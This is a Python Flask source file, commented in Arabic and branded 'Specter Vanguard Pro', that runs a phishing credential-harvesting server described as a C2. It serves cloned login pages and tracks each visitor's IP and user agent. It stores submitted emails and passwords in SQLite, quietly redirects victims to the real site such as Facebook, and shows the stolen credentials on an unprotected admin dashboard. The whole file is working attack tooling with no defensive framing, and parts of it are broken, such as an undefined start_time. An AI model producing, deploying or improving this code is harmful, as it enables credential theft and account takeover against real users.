from flask import Flask, request, jsonify, render_template_string, make_response
import json
import time
import hashlib
import threading
from datetime import datetime
import sqlite3
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

class AdvancedC2Server:
    def __init__(self):
        self.credentials_db = "data/credentials.db"
        self._init_database()
        self.active_sessions = {}
        
    def _init_database(self):
        """تهيئة قاعدة بيانات SQLite"""
        os.makedirs(os.path.dirname(self.credentials_db), exist_ok=True)
        conn = sqlite3.connect(self.credentials_db)
        cursor = conn.cursor()
        
        # جدول بيانات الاعتماد
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME,
                email TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                session_id TEXT,
                original_url TEXT,
                status TEXT DEFAULT 'new'
            )
        ''')
        
        # جدول الجلسات النشطة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                start_time DATETIME,
                last_activity DATETIME,
                ip_address TEXT,
                user_agent TEXT,
                pages_visited INTEGER DEFAULT 0,
                credentials_captured INTEGER DEFAULT 0
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def log_credentials(self, data):
        """تسجيل بيانات الاعتماد في قاعدة البيانات"""
        conn = sqlite3.connect(self.credentials_db)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO credentials 
            (timestamp, email, password, ip_address, user_agent, session_id, original_url)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now(),
            data.get('email'),
            data.get('password'),
            request.remote_addr,
            request.headers.get('User-Agent'),
            data.get('session_id', 'unknown'),
            data.get('original_url', 'unknown')
        ))
        
        conn.commit()
        conn.close()
        
        # تحديث إحصائيات الجلسة
        session_id = data.get('session_id')
        if session_id:
            self._update_session_stats(session_id, 'credentials_captured')
        
        return True
    
    def _update_session_stats(self, session_id, field):
        """تحديث إحصائيات الجلسة"""
        conn = sqlite3.connect(self.credentials_db)
        cursor = conn.cursor()
        
        if field == 'pages_visited':
            cursor.execute('''
                UPDATE sessions 
                SET pages_visited = pages_visited + 1, 
                    last_activity = ?
                WHERE session_id = ?
            ''', (datetime.now(), session_id))
        elif field == 'credentials_captured':
            cursor.execute('''
                UPDATE sessions 
                SET credentials_captured = credentials_captured + 1, 
                    last_activity = ?
                WHERE session_id = ?
            ''', (datetime.now(), session_id))
        
        conn.commit()
        conn.close()

@app.route('/')
def serve_cloned_page():
    """خدمة الصفحة المستنسخة"""
    session_id = request.cookies.get('session_id')
    if not session_id:
        session_id = hashlib.md5(f"{request.remote_addr}{time.time()}".encode()).hexdigest()
    
    # تسجيل الجلسة الجديدة
    conn = sqlite3.connect("data/credentials.db")
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR IGNORE INTO sessions 
        (session_id, start_time, last_activity, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?)
    ''', (
        session_id,
        datetime.now(),
        datetime.now(),
        request.remote_addr,
        request.headers.get('User-Agent')
    ))
    conn.commit()
    conn.close()
    
    # قراءة آخر صفحة مستنسخة
    template_dir = "data/templates"
    if os.path.exists(template_dir):
        html_files = [f for f in os.listdir(template_dir) if f.endswith('.html')]
        if html_files:
            latest_file = max(html_files, key=lambda x: os.path.getctime(os.path.join(template_dir, x)))
            with open(os.path.join(template_dir, latest_file), 'r', encoding='utf-8') as f:
                html_content = f.read()
            
            # تحديث إحصائيات الجلسة
            server = AdvancedC2Server()
            server._update_session_stats(session_id, 'pages_visited')
            
            # إعداد الرد مع الكوكي
            resp = make_response(html_content)
            resp.set_cookie('session_id', session_id, max_age=3600)
            return resp
    
    return "System Initializing...", 200

@app.route('/submit_credentials', methods=['POST'])
def collect_credentials():
    """جمع بيانات الاعتماد"""
    server = AdvancedC2Server()
    
    credentials = {
        'email': request.form.get('email', ''),
        'password': request.form.get('password', ''),
        'session_id': request.cookies.get('session_id', 'unknown'),
        'original_url': request.form.get('original_url', '')
    }
    
    # تسجيل البيانات
    server.log_credentials(credentials)
    
    # إعادة توجيه إلى الموقع الأصلي
    redirect_url = credentials.get('original_url', 'https://www.facebook.com')
    return f'''
    <html>
        <head>
            <meta http-equiv="refresh" content="3; url={redirect_url}" />
        </head>
        <body>
            <p>Verification successful. Redirecting...</p>
        </body>
    </html>
    '''

@app.route('/admin/dashboard')
def admin_dashboard():
    """لوحة التحكم الإدارية"""
    conn = sqlite3.connect("data/credentials.db")
    cursor = conn.cursor()
    
    # إحصائيات
    cursor.execute('SELECT COUNT(*) FROM credentials')
    total_creds = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(DISTINCT session_id) FROM sessions')
    total_sessions = cursor.fetchone()[0]
    
    cursor.execute('SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 10')
    recent_creds = cursor.fetchall()
    
    conn.close()
    
    dashboard_html = f"""
    <html>
    <head>
        <title>Specter Vanguard Pro - Admin Dashboard</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .stats {{ background: #f0f0f0; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
            .credential {{ border: 1px solid #ddd; padding: 10px; margin: 5px 0; background: #fff; }}
        </style>
    </head>
    <body>
        <h1>Specter Vanguard Pro - Admin Dashboard</h1>
        <div class="stats">
            <h2>Statistics</h2>
            <p>Total Credentials Captured: <strong>{total_creds}</strong></p>
            <p>Active Sessions: <strong>{total_sessions}</strong></p>
            <p>System Uptime: <strong>{int(time.time() - start_time)} seconds</strong></p>
        </div>
        <h2>Recent Credentials</h2>
        {"".join([f'<div class="credential">{cred}</div>' for cred in recent_creds])}
    </body>
    </html>
    """
    
    return dashboard_html

def run_c2_server(host='0.0.0.0', port=8080):
    """تشغيل خادم C2"""
    print(f"[*] Starting Advanced C2 Server on {host}:{port}")
    app.run(host=host, port=port, debug=False, threaded=True)
